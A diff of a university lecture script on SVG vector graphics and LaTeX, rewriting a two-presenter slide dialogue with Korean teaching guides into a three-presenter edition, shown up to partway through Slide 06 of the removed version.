@@ -1,8 +1,8 @@
 # Session 13: Calculated Art: SVG Vector Engineering & LaTeX Mathematical Orchestration
 **Course:** The Architect of Intelligence: Mastering Agentic IT & Strategic Wisdom  
-**Instructors:** Professor Peter Kim (54, Director) & TA Sarah Jenkins (31, AI Research Fellow) • Oikos University (www.oikos.edu)  
-**Lecture Format:** NotebookLM Style Interactive Duo Dialogue (2-Presenter Co-Lecture)  
-**Total Slides:** 40 Slides (60 Minutes)  
+**Instructors:** Professor Peter Kim (Director), TA Sarah Jenkins (Senior AI Fellow) & TA James Wilson (DevOps TA) • Oikos University (www.oikos.edu)  
+**Lecture Format:** Full 75-Minute Broadcast Trio Master Dialogue (4x Modules with 5 Enterprise Case Studies)  
+**Total Slides:** 45 Slides (Expanded Multi-Presenter Master Edition)  
 **Motto:** Soli Deo Gloria  
 
 ---
@@ -11,1091 +11,1384 @@
 - [Slide 01: OIKOS UNIVERSITY • SOLI DEO GLORIA](#slide-01-oikos-university-soli-deo-gloria)
 - [Slide 02: PART 1: THE TRAGEDY OF RASTER SCALE & CALCULATED VECTOR ART](#slide-02-part-1-the-tragedy-of-raster-scale-and-calculated-vector-art)
 - [Slide 03: RECLAIMING THE SABBATH: ESCAPING AESTHETIC MUCK](#slide-03-reclaiming-the-sabbath-escaping-aesthetic-muck)
-- [Slide 04: RASTER ARCHITECTURE: PIXELS LOCKED IN STATIC GRIDS](#slide-04-raster-architecture-pixels-locked-in-static-grids)
-- [Slide 05: THE TRAGEDY OF SCALE: WHEN RESOLUTION COLLAPSES](#slide-05-the-tragedy-of-scale-when-resolution-collapses)
-- [Slide 06: THE MATHEMATICS OF STORAGE: QUADRATIC WASTE](#slide-06-the-mathematics-of-storage-quadratic-waste)
-- [Slide 07: THE VECTOR BREAKTHROUGH: CODING DYNAMIC INSTRUCTIONS](#slide-07-the-vector-breakthrough-coding-dynamic-instructions)
-- [Slide 08: PNG/JPG VS. SVG: THE MASTER COMPARISON MATRIX](#slide-08-png/jpg-vs-svg-the-master-comparison-matrix)
-- [Slide 09: PYTHON SIMULATION: SLICING STORAGE BY 99%](#slide-09-python-simulation-slicing-storage-by-99%)
-- [Slide 10: INTERACTIVE POLL: RECLAIMING YOUR DESIGN TIME](#slide-10-interactive-poll-reclaiming-your-design-time)
-- [Slide 11: PART 2: THE XML FABRIC OF SVG](#slide-11-part-2-the-xml-fabric-of-svg)
-- [Slide 12: SVG AS AN OPEN XML DIALECT: BROWSER NATIVE](#slide-12-svg-as-an-open-xml-dialect-browser-native)
-- [Slide 13: PILLAR SHAPES: PATHS, ARCS, AND GROUPING](#slide-13-pillar-shapes-paths,-arcs,-and-grouping)
-- [Slide 14: THE CALCULUS OF BEZIER CURVES: PERFECT ARCS](#slide-14-the-calculus-of-bezier-curves-perfect-arcs)
-- [Slide 15: DOM MASTERY: STYLING VECTOR NODES WITH CSS & JS](#slide-15-dom-mastery-styling-vector-nodes-with-css-and-js)
-- [Slide 16: RESPONSIVE VECTORS: THE VIEWBOX ATTRIBUTE](#slide-16-responsive-vectors-the-viewbox-attribute)
-- [Slide 17: THE SEO RENAISSANCE: SEARCHABLE VECTOR TEXT](#slide-17-the-seo-renaissance-searchable-vector-text)
-- [Slide 18: DIGITAL INCLUSION: SCREEN READERS & WCAG 2.1](#slide-18-digital-inclusion-screen-readers-and-wcag-21)
+- [Slide 04: RASTER ARCHITECTURE: PIXELS LOCKED IN GRIDS](#slide-04-raster-architecture-pixels-locked-in-grids)
+- [Slide 05: THE TRAGEDY OF SCALE: RESOLUTION COLLAPSE](#slide-05-the-tragedy-of-scale-resolution-collapse)
+- [Slide 06: THE VECTOR BREAKTHROUGH: DYNAMIC CODE](#slide-06-the-vector-breakthrough-dynamic-code)
+- [Slide 07: PNG/JPG VS. SVG: MASTER COMPARISON MATRIX](#slide-07-png-jpg-vs-svg-master-comparison-matrix)
+- [Slide 08: PYTHON SIMULATION: SLICING STORAGE BY 99%](#slide-08-python-simulation-slicing-storage-by-99%)
+- [Slide 09: 📨 INTERACTIVE POLL: DESIGN & VISUAL BOTTLENECK](#slide-09-📨-interactive-poll-design-and-visual-bottleneck)
+- [Slide 10: PART 1 TRANSITION: ENTERING THE XML FABRIC](#slide-10-part-1-transition-entering-the-xml-fabric)
+- [Slide 11: CASE STUDY 1: WALL STREET MILLISECOND CHARTING](#slide-11-case-study-1-wall-street-millisecond-charting)
+- [Slide 12: PART 2: THE XML FABRIC OF SVG](#slide-12-part-2-the-xml-fabric-of-svg)
+- [Slide 13: SVG AS AN OPEN XML DIALECT: BROWSER NATIVE](#slide-13-svg-as-an-open-xml-dialect-browser-native)
+- [Slide 14: PILLAR SHAPES: PATHS, ARCS, AND GROUPING](#slide-14-pillar-shapes-paths,-arcs,-and-grouping)
+- [Slide 15: THE CALCULUS OF BEZIER CURVES: PERFECT ARCS](#slide-15-the-calculus-of-bezier-curves-perfect-arcs)
+- [Slide 16: DOM MASTERY: STYLING WITH CSS & JS](#slide-16-dom-mastery-styling-with-css-and-js)
+- [Slide 17: RESPONSIVE VECTORS: THE VIEWBOX ATTRIBUTE](#slide-17-responsive-vectors-the-viewbox-attribute)
+- [Slide 18: DIGITAL INCLUSION: WCAG 2.1 ACCESSIBILITY](#slide-18-digital-inclusion-wcag-21-accessibility)
 - [Slide 19: CASE STUDY: 1,000X ASSET COMPRESSION IN SAAS](#slide-19-case-study-1,000x-asset-compression-in-saas)
-- [Slide 20: PART 2 DISCUSSION: REDESIGNING LEGACY PIPELINES](#slide-20-part-2-discussion-redesigning-legacy-pipelines)
-- [Slide 21: PART 3: GEMINI-POWERED VISUAL ENGINEERING](#slide-21-part-3-gemini-powered-visual-engineering)
-- [Slide 22: GEMINI AS A MULTIMODAL CODE ARCHITECT](#slide-22-gemini-as-a-multimodal-code-architect)
-- [Slide 23: THE CANVAS INTERFACE: HUMAN-AI CO-DESIGN](#slide-23-the-canvas-interface-human-ai-co-design)
-- [Slide 24: DIRECT PARAMETER CONTROLS: FINE-TUNING OUTPUT](#slide-24-direct-parameter-controls-fine-tuning-output)
-- [Slide 25: TAMING PATH OVERFITTING: BEZIER VS. STRAIGHT LINES](#slide-25-taming-path-overfitting-bezier-vs-straight-lines)
-- [Slide 26: RESOLVING FRAGMENTED PATHS: THE CLOSING 'Z' ATTRIBUTE](#slide-26-resolving-fragmented-paths-the-closing-z-attribute)
-- [Slide 27: XML NODE SANITATION: PRUNING REDUNDANT BLOAT](#slide-27-xml-node-sanitation-pruning-redundant-bloat)
-- [Slide 28: INTERACTIVE UI ELEMENTS: GENERATING CLICKABLE MAPS](#slide-28-interactive-ui-elements-generating-clickable-maps)
-- [Slide 29: DYNAMIC THEME ADAPTABILITY: LIGHT & DARK MODES](#slide-29-dynamic-theme-adaptability-light-and-dark-modes)
-- [Slide 30: PART 3 AUDIT CHECKLIST: VERIFYING VECTOR CODE](#slide-30-part-3-audit-checklist-verifying-vector-code)
-- [Slide 31: PART 4: LATEX MATHEMATICAL ORCHESTRATION](#slide-31-part-4-latex-mathematical-orchestration)
-- [Slide 32: LATEX: THE GLOBAL SCIENTIFIC STANDARD](#slide-32-latex-the-global-scientific-standard)
-- [Slide 33: MULTIMODAL TRANSCRIPTION: HANDWRITING TO LATEX](#slide-33-multimodal-transcription-handwriting-to-latex)
-- [Slide 34: FORMULA DELIVERY: MATHJAX VS. PRE-RENDERED SVG](#slide-34-formula-delivery-mathjax-vs-pre-rendered-svg)
-- [Slide 35: ACADEMIC SOPS: RAG PLATFORM INTEGRATION](#slide-35-academic-sops-rag-platform-integration)
-- [Slide 36: SECURITY & GOVERNANCE: SANITIZING SVGS AGAINST XSS](#slide-36-security-and-governance-sanitizing-svgs-against-xss)
-- [Slide 37: GREEN SUSTAINABLE IT: POWER SAVINGS OF VECTORS](#slide-37-green-sustainable-it-power-savings-of-vectors)
-- [Slide 38: WISDOM SYNTHESIS: THE SOVEREIGN HUMAN CONDUCTOR](#slide-38-wisdom-synthesis-the-sovereign-human-conductor)
-- [Slide 39: HANDS-ON LAB 13: BUILDING A RESPONSIVE SVG DASHBOARD](#slide-39-hands-on-lab-13-building-a-responsive-svg-dashboard)
-- [Slide 40: COURSE SUMMARY: ELEVATING HUMAN FOCUS THROUGH CODE](#slide-40-course-summary-elevating-human-focus-through-code)
+- [Slide 20: PART 2 DISCUSSION: REDESIGNING PIPELINES](#slide-20-part-2-discussion-redesigning-pipelines)
+- [Slide 21: GEMINI AS A MULTIMODAL CODE ARCHITECT](#slide-21-gemini-as-a-multimodal-code-architect)
+- [Slide 22: CASE STUDY 2: AEROSPACE TURBINE CAD VECTORS](#slide-22-case-study-2-aerospace-turbine-cad-vectors)
+- [Slide 23: PART 3: GEMINI-POWERED VISUAL ENGINEERING](#slide-23-part-3-gemini-powered-visual-engineering)
+- [Slide 24: THE CANVAS INTERFACE: HUMAN-AI CO-DESIGN](#slide-24-the-canvas-interface-human-ai-co-design)
+- [Slide 25: XML NODE SANITATION: PRUNING BLOAT](#slide-25-xml-node-sanitation-pruning-bloat)
+- [Slide 26: DYNAMIC THEME ADAPTABILITY: LIGHT & DARK](#slide-26-dynamic-theme-adaptability-light-and-dark)
+- [Slide 27: SECURITY: SANITIZING SVGS AGAINST XSS](#slide-27-security-sanitizing-svgs-against-xss)
+- [Slide 28: PART 3 TRANSITION: ENTERING LATEX ORCHESTRATION](#slide-28-part-3-transition-entering-latex-orchestration)
+- [Slide 29: LATEX: THE GLOBAL SCIENTIFIC STANDARD](#slide-29-latex-the-global-scientific-standard)
+- [Slide 30: MULTIMODAL TRANSCRIPTION: HANDWRITING TO LATEX](#slide-30-multimodal-transcription-handwriting-to-latex)
+- [Slide 31: FORMULA DELIVERY: MATHJAX VS. SVG](#slide-31-formula-delivery-mathjax-vs-svg)
+- [Slide 32: SOLI DEO GLORIA: DIVINE GEOMETRY](#slide-32-soli-deo-gloria-divine-geometry)
+- [Slide 33: CASE STUDY 3: SEMICONDUCTOR WAFER VECTORS](#slide-33-case-study-3-semiconductor-wafer-vectors)
+- [Slide 34: PART 4: SYNTHESIS, COCKPITS & WORKSTATIONS](#slide-34-part-4-synthesis,-cockpits-and-workstations)
+- [Slide 35: SESSION 13 SUMMARY & KEY TAKEAWAYS](#slide-35-session-13-summary-and-key-takeaways)
+- [Slide 36: LIFE OS VISUAL & MATHEMATICAL COCKPIT](#slide-36-life-os-visual-and-mathematical-cockpit)
+- [Slide 37: PROJECT EVALUATION RUBRIC FOR SESSION 13](#slide-37-project-evaluation-rubric-for-session-13)
+- [Slide 38: NEXT HORIZON: GOOGLE FLOW AI VS. RUNWAY](#slide-38-next-horizon-google-flow-ai-vs-runway)
+- [Slide 39: THE ARCHITECT'S MATHEMATICAL INTEGRITY](#slide-39-the-architects-mathematical-integrity)
+- [Slide 40: CASE STUDY 4: MEDICAL MRI VECTOR SLICING](#slide-40-case-study-4-medical-mri-vector-slicing)
+- [Slide 41: THE 6-STEP CALCULATED ART BLUEPRINT](#slide-41-the-6-step-calculated-art-blueprint)
+- [Slide 42: PRODUCTION CHECKLIST: PRE-DEPLOYMENT VERIFICATION](#slide-42-production-checklist-pre-deployment-verification)
+- [Slide 43: GREEN SUSTAINABLE IT: POWER SAVINGS OF VECTORS](#slide-43-green-sustainable-it-power-savings-of-vectors)
+- [Slide 44: CASE STUDY 5: 30X BANDWIDTH COMPRESSION ROI](#slide-44-case-study-5-30x-bandwidth-compression-roi)
+- [Slide 45: 🛠️ HANDS-ON LAB 13 & CONCLUSION](#slide-45-🛠️-hands-on-lab-13-and-conclusion)
 
 ---
 
 ## Slide 01: OIKOS UNIVERSITY • SOLI DEO GLORIA
 **Subtitle:** THE ARCHITECT OF INTELLIGENCE: Mastering Agentic IT & Strategic Wisdom
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Welcome back, everyone, to Oikos University! I am Professor Peter Kim, Director of Smart Insight Lab. Today, we begin our exciting Session 13: "OIKOS UNIVERSITY • SOLI DEO GLORIA".
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Welcome back, global scholars and architects, to Oikos University! I am Professor Peter Kim, Director of Smart Insight Lab. Today on Slide 1, we enter the world of crystalline mathematical aesthetics: "Session 13: Calculated Art: SVG Vector Engineering & LaTeX Mathematical Orchestration."
 
-[TA Sarah] And hello everyone! I'm Sarah Jenkins, your Teaching Assistant and AI Research Fellow. Professor Kim and I are so excited to explore today's architecture with you all!
+[TA Sarah] Hello everyone! I am Sarah Jenkins, Senior AI Fellow. For decades, the digital web has been suffocated by heavy, blurry raster bitmap images (PNG, JPG, WebP). When you zoom in on a 4K or 8K retina monitor, raster pixels blur and fragment into ugly colored squares!
 
-[Prof. Peter] Exactly, Sarah. In this session, we go beyond surface-level theory into real-world agentic mastery. We are learning how to architect systems that work reliably and elevate human potential.
+[TA James] And I am James Wilson, your DevOps TA! Calculated Art transforms visual engineering forever: replacing millions of static pixels with lightweight mathematical equations—Scalable Vector Graphics (SVG), Bezier calculus, HTML5 Canvas shaders, and publication-grade LaTeX typography!
 
-[TA Sarah] For all our global students, we will guide you step by step in clear, accessible English. Let's dive straight into Session 13!
+[Prof. Peter] Under our founding motto, "SOLI DEO GLORIA—To God Alone Be the Glory," let us master the mathematical beauty of infinite vector clarity and elevate human interfaces into works of divine order.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** Session 13 개요 및 SVG 벡터 공학과 LaTeX 수식 조율 환영 인사
-- **핵심 포인트:**
-  - 강의 주제: 픽셀(비트맵)의 한계를 넘어 무한 해상도의 수학적 벡터 코드(SVG)와 LaTeX 수식 체계 마스터
-  - 래스터 이미지의 2차 비효율 극복 및 브라우저 DOM 네이티브 벡터 스타일링
-  - 멀티모달 Gemini AI를 통한 텍스트-벡터/LaTeX 자동 변환 및 친환경 지속 가능 웹 엔지니어링
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+[TA Sarah] Let us open Part 1 and explore the Tragedy of Raster Scale on Slide 2!
 
-### 📚 Key Terms (주요 용어)
-- **Calculated Art**: Rendering visual aesthetics and scientific equations through executable mathematical formulas rather than static pixel grids. (계산된 예술 (수학적 수식 및 코드로 구현하는 시각 예술))
-- **SVG Vector Engineering**: Using scalable vector graphics XML code to build infinitely sharp, interactive, and lightweight web assets. (SVG 벡터 엔지니어링 (XML 기반 무한 해상도 벡터 공학))
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Session 13 개요 및 Oikos University 3인 강사진(피터 교수, 사라 수석조교, 제임스 개발조교) 환영 인사
+
+**핵심 티칭 포인트:**
+- 강의 주제: 계산된 예술(Calculated Art): SVG 벡터 엔지니어링과 LaTeX 수학 오케스트레이션
+- 래스터 픽셀(PNG/JPG)의 한계 극복: 4K/8K 화면에서도 절대 깨지지 않는 무한 해상도 수학적 벡터 그래픽
+- 베지에 곡선(Bezier Curve) 미적분, HTML5 캔버스 셰이더, 학술 조판 표준 LaTeX 수식 시스템
+
+**강의 전달 팁:** 피터 교수의 수학적 질서와 미학 철학, 사라 조교의 SVG DOM 엔지니어링 분석, 제임스 조교의 초경량 자산 최적화 관점을 결합하세요.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Calculated Art** (계산된 예술 (Calculated Art)): The programmatic generation of visual charts, diagrams, and UI assets using exact mathematical vector formulas and code.
+- **Scalable Vector Graphics (SVG)** (확장 가능한 벡터 그래픽 (SVG)): An XML-based open standard vector image format for two-dimensional graphics with support for interactivity and animation.
 
 ---
 
 ## Slide 02: PART 1: THE TRAGEDY OF RASTER SCALE & CALCULATED VECTOR ART
-**Subtitle:** Soli Deo Gloria: Perfect forms in mathematical order and infinite precision
+**Subtitle:** Deconstructing quadratic pixel memory waste and discovering resolution-independent mathematical clarity
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 2: "PART 1: THE TRAGEDY OF RASTER SCALE & CALCULATED VECTOR ART". We begin Part 1 of Session 13: "The Tragedy of Raster Scale & Calculated Vector Art."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[TA Sarah] Look at Slide 2: "PART 1: THE TRAGEDY OF RASTER SCALE & CALCULATED VECTOR ART." Professor, why do computer scientists call bitmap images a 'quadratic memory tragedy'?
 
-[TA Sarah] Professor Kim, looking at this slide, under Soli Deo Gloria, we pursue the divine perfection of mathematical order.
+[Prof. Peter] Because a raster image stores every single individual pixel in a static 2D grid! If you double the screen resolution from 1080p to 4K, the memory and file size explode by $4\times$ ($O(W \times H)$)! That is quadratic resource waste!
 
-[Prof. Peter] For decades, digital graphics relied on raster pixels—static grids of dots. But when you zoom into a raster image, it collapses into blurry jagged blocks, and file sizes explode quadratically!
+[TA James] In contrast, an SVG vector stores the mathematical equation: `circle cx=50 cy=50 r=40`. Whether you display that circle on a 2-inch smartwatch or a 200-foot billboard in Times Square, the file size remains exactly 45 bytes, with infinite, razor-sharp clarity!
 
-[TA Sarah] Notice also that in this opening module, we celebrate Calculated Art: SVG Vector Engineering! Instead of storing colored dots, SVG stores pure mathematical equations. A few kilobytes scale infinitely to 8K and beyond with razor-sharp clarity! Let us explore Part 1!
+[TA Sarah] In Part 1, we deconstruct the mathematics of storage and the PNG vs. SVG comparison matrix.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** Part 1 섹션 전환: 래스터 스케일의 비극과 계산된 벡터 예술
-- **핵심 포인트:**
-  - 수학적 질서와 Soli Deo Gloria: 확대하면 깨지고 용량이 폭증하는 래스터(픽셀)의 비극 극복
-  - 몇 킬로바이트의 가벼운 수학 방정식으로 8K 디스플레이까지 무한히 선명하게 뻗어 나가는 SVG 벡터 엔지니어링
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+[Prof. Peter] Let us examine escaping aesthetic muck on Slide 3.
 
-### 📚 Key Terms (주요 용어)
-- **Calculated Vector Art**: Digital visual graphics rendered via deterministic mathematical geometry rather than static pixel grids. (계산된 벡터 예술 (SVG 수학 렌더링))
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** Part 1 섹션 전환: 래스터 비트맵의 2차 메모리 낭비와 수학적 벡터의 혁신
+
+**핵심 티칭 포인트:**
+- 래스터 픽셀의 비극: 해상도를 2배 올리면 파일 크기와 메모리가 4배 폭증하는 O(W x H)의 2차 자원 낭비
+- 벡터의 수학적 우아함: 원 하나를 그릴 때 스마트워치든 타임스스퀘어 전광판이든 단 45바이트로 무한 선명도 유지
+- PNG/JPG 대 SVG 마스터 비교 매트릭스와 파이썬 시뮬레이션(99% 용량 절감)
+
+**강의 전달 팁:** 사라 조교가 2차 낭비의 수식을 짚고 제임스가 45바이트의 무한 해상도 기적을 강조합니다.
+
+### 📚 Key Technical Terms (핵심 용어)
+- **Quadratic Memory Waste ($O(W \times H)$)** (2차 메모리 낭비 복잡도): The exponential memory scaling of raster bitmaps where storage grows quadratically with display resolution.
+- **Resolution-Independent Clarity** (무한 해상도 불변 선명도): The optical rendering property where graphics remain perfectly sharp at any arbitrary scale or magnification.
 
 ---
 
 ## Slide 03: RECLAIMING THE SABBATH: ESCAPING AESTHETIC MUCK
-**Subtitle:** Rescuing 3 to 4 hours weekly by automating manual Photoshop exports and format adjustments
+**Subtitle:** Liberating UI designers from 30 hours of Photoshop pixel-pushing to focus on high-order systems design
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 3: "RECLAIMING THE SABBATH: ESCAPING AESTHETIC MUCK". Please look at Slide 3: "Reclaiming the Sabbath: Escaping Aesthetic Muck."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 3 explores "RECLAIMING THE SABBATH: ESCAPING AESTHETIC MUCK."
 
-[TA Sarah] Professor Kim, looking at this slide, think of the exhausting hours designers spend in Photoshop: resizing logos for twenty different screen resolutions, re-exporting banners, and adjusting color formats. We call this "aesthetic muck"—low-value, repetitive friction!
+[TA Sarah] In traditional UI design agencies, junior designers waste 30 hours a week in Photoshop 'pixel-pushing'—manually slicing and exporting 50 different PNG resolutions (@1x, @2x, @3x, retina, banner, icon)!
 
-[Prof. Peter] Our biblical mandate to "redeem the time" calls us to automate this drudgery.
+[TA James] Antigravity and Calculated SVGs eliminate 100% of that manual slicing slavery! You write one clean, semantic SVG file, and the browser's GPU renders it crisply across every iPhone, Android, and 8K TV automatically!
 
-[TA Sarah] Notice also that by commanding multimodal AI agents to generate mathematically flexible SVG code directly, we eliminate the export grind entirely!
+[Prof. Peter] Let us examine raster architecture and static pixel grids on Slide 4.
 
-[Prof. Peter] You reclaim three to four hours of deep creative focus and peaceful Sabbath rest every single week!
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 안식의 회복: 포토샵 픽셀 노역에서 벗어나 시스템 디자인으로의 도약
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 안식의 회복: 디자인 노역(Aesthetic Muck) 탈출과 주 3~4시간 시간 구속
-- **핵심 포인트:**
-  - 1. 디자인 잡무의 늪 (Aesthetic Muck): 포토샵에서 해상도별로 아이콘 크기 바꾸고 내보내느라 진이 빠지는 노역
-  - 2. 에이전틱 자동화: 멀티모달 AI에게 자연어로 지시하여 한 번에 모든 해상도에 대응하는 SVG 코드를 즉시 생성
-  - 3. 안식의 여백 회복: 기계적 디자인 잡무에서 벗어나 매주 3~4시간의 거룩한 안식과 심층 연구 시간 확보
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+**핵심 티칭 포인트:**
+- 디자이너의 덫: @1x, @2x, @3x, 웹, 앱, 인쇄용으로 50개 PNG를 수작업 슬라이싱하던 고통
+- 계산된 벡터 안식: 단 하나의 반응형 SVG 템플릿으로 모든 해상도에 완벽 대응하여 주당 25시간 회수
+- 동적 타이포그래피, 모션 물리, 사용자 심리학 등 고차원 디자인 시스템에 몰입
 
-### 📚 Key Terms (주요 용어)
-- **Aesthetic Muck**: Low-cognitive, repetitive design labor such as manual resizing, cropping, and multi-format exporting. (디자인 잡무의 늪 (Aesthetic Muck))
+**강의 전달 팁:** 사라 조교와 제임스 조교가 수작업 PNG 슬라이싱 노역에서 해방되는 기쁨을 전달합니다.
 
----
-
-## Slide 04: RASTER ARCHITECTURE: PIXELS LOCKED IN STATIC GRIDS
-**Subtitle:** How PNG, JPG, and WebP files trap visual data in rigid, un-scalable memory maps
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's look at Slide 4: "RASTER ARCHITECTURE: PIXELS LOCKED IN STATIC GRIDS". Look at Slide 4: "Raster Architecture: How Pixels Lock Data in Static Grids."
-
-[TA Sarah] Professor Kim, looking at this slide, to understand why vectors are superior, let us examine traditional raster images like PNG, JPG, and WebP.
-
-[Prof. Peter] A raster file is simply a fixed 2D grid of colored dots saved in historical memory. It has no awareness of geometry or shape!
-
-[TA Sarah] Notice also that when you need a larger image, you must pack millions of additional color dots into the file. This creates bloated multi-megabyte files that choke mobile bandwidth and force phone browsers to render millions of redundant pixels linearly!
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 래스터(Raster) 아키텍처의 한계: 정적 격자에 갇힌 픽셀들
-- **핵심 포인트:**
-  - 1. 고정된 점 행렬: PNG, JPG는 색상 점들의 고정된 2D 격자 배열일 뿐 기하학적 형태를 알지 못함
-  - 2. 메모리 및 캐시 낭비: 해상도를 조금만 올려도 파일 용량이 기하급수적으로 폭증하여 모바일 네트워크 병목 유발
-  - 3. 선형적 렌더링 부하: 브라우저가 수백만 개의 점들을 하나하나 순차적으로 스캔하느라 CPU/RAM 과부하 발생
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
-
-### 📚 Key Terms (주요 용어)
-- **Raster Architecture**: A digital image format storing graphics as a rigid two-dimensional matrix of colored pixel dots. (래스터 아키텍처 (비트맵 픽셀 격자 방식))
+### 📚 Key Technical Terms (핵심 용어)
+- **Pixel-Pushing Drag** (픽셀 수작업 노역 (Pixel-Pushing)): The repetitive, low-value mechanical labor of manually resizing and re-exporting raster images for multiple devices.
+- **Parametric Vector Template** (매개변수형 벡터 템플릿): A single code-driven graphic asset that dynamically adjusts layout, line weight, and color via CSS variables.
 
 ---
 
-## Slide 05: THE TRAGEDY OF SCALE: WHEN RESOLUTION COLLAPSES
-**Subtitle:** The Aliasing Monster on 4K Retina screens vs. crisp vector mathematical scaling
+## Slide 04: RASTER ARCHITECTURE: PIXELS LOCKED IN GRIDS
+**Subtitle:** Why PNG, JPEG, and WebP are fundamentally trapped in static coordinate matrices
+**Instructor:** Prof. Peter Kim • TA Sarah Jenkins • TA James Wilson • Smart Insight Lab
 
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 5: "THE TRAGEDY OF SCALE: WHEN RESOLUTION COLLAPSES". Slide 5 illustrates "The Tragedy of Scale: When Resolution Collapses."
+### 🎙️ English Lecture Script (Full 75-Min Broadcast Trio Dialogue)
+[Prof. Peter] Slide 4 details "RASTER ARCHITECTURE: PIXELS LOCKED IN STATIC GRIDS."
 
-[TA Sarah] Professor Kim, this is such a critical concept for our students! Look at what happens when you stretch a small raster icon on the left:
-You encounter the "Aliasing Monster"! The computer tries to guess the missing pixels, turning elegant curves into ugly, jagged staircases and blurry smudges! On modern 4K and Retina screens, this blur looks terrible and destroys user trust!
+[TA Sarah] Look at how a raster image works: A JPEG or PNG is simply a dumb matrix of color numbers! It has no concept of what is inside the image.
 
-[Prof. Peter] Exactly, Sarah. Now look at the right:
-A mathematical vector equation does not guess! It recalculates the curves on the fly, delivering needle-sharp perfection on any display!
+[TA James] When you zoom in by 400%, the browser tries to guess missing pixels using interpolation, turning sharp text into blurry, jagged mush! Furthermore, screen readers cannot read the text inside a PNG, destroying web accessibility!
 
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
+[Prof. Peter] Let us examine the mathematics of storage on Slide 5.
 
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 확대의 비극: 해상도 붕괴와 앨리어싱 괴물(The Aliasing Monster)
-- **핵심 포인트:**
-  - Left (래스터 확대의 참사): 작은 PNG를 확대하면 컴퓨터가 빈 공간을 대충 뭉개며 계단 현상(Aliasing)과 흐림 발생
-  - Right (벡터 수식의 완벽성): 어떤 크기로 확대하든 뷰포트 해상도에 맞춰 수식을 즉시 재계산하여 바늘 끝처럼 선명함 유지
-  - 신뢰성: 흐릿한 대시보드 그래프는 고객에게 시스템이 낡고 불안정하다는 인상을 주므로 벡터 전환이 필수적임
-- **강의 전달 팁:** 피터 교수(54세, 거시적 비전/전략)와 사라 조교(31세, 실무 엔지니어링/질문자)의 활기찬 핑퐁 대화 톤으로 강의를 전달하세요.
+### 🇰🇷 한국어 강의 가이드 및 핵심 요약
+**개요 요약:** 래스터 비트맵 아키텍처: 정적 격자에 갇힌 멍청한 픽셀 매트릭스
 
-### 📚 Key Terms (주요 용어)
-- **Aliasing Monster**: The visual distortion and jagged staircasing occurring when fixed pixel grids are stretched beyond native resolution. (앨리어싱 (계단 현상 및 해상도 깨짐))
+**핵심 티칭 포인트:**
+- 래스터의 감옥: 이미지 전체가 [R, G, B] 숫자들의 정적 2차원 배열로 고정 저장됨
+- 보간 왜곡: 400% 확대 시 픽셀이 늘어나며 계단 현상과 뿌연 블러(Blur) 발생
+- 시맨틱 제로: 컴퓨터 입장에서 원인지, 텍스트인지, 화살표인지 인식 불가 (스크린 리더 판독 불가)
 
----
+**강의 전달 팁:** 사라 조교와 제임스 조교가 래스터 비트맵의 구조적 한계와 접근성 파괴를 설명합니다.
 
-## Slide 06: THE MATHEMATICS OF STORAGE: QUADRATIC WASTE
-**Subtitle:** Why doubling pixel resolution increases storage by 4x while vector code stays flat
-
-### 🎙️ English Lecture Script (Duo Dialogue)
-[Prof. Peter] Let's examine Slide 6: "THE MATHEMATICS OF STORAGE: QUADRATIC WASTE". Please look at Slide 6: "The Mathematics of Storage: Quadratic Waste."
-
-[TA Sarah] Professor Kim, this is such a critical concept for our students! Let us examine the computer science math:
-Raster storage follows the Square-Law rule: Area equals width multiplied by height.
-If you double an image's resolution, the file size does not double—it multiplies by four!
-If you scale an image tenfold, you need ONE HUNDRED TIMES more server storage and network bandwidth!
-
-[Prof. Peter] Exactly, Sarah. In contrast, SVG vector code stays completely flat! A 5-kilobyte SVG renders at 8K resolution without adding a single extra byte!
-
-[TA Sarah] That is why understanding this balance gives us true strategic leverage.
-
-### 🇰🇷 Korean Teaching Guide (강의 가이드)
-- **강의 요약:** 저장공간의 수학적 법칙: 래스터의 2차(Quadratic) 낭비 공식
-- **핵심 포인트:**
-  - 1. 제곱의 법칙 (Square-Law): 면적은 가로×세로(N²)이므로 해상도를 2배 키우면 용량은 4배로 폭증
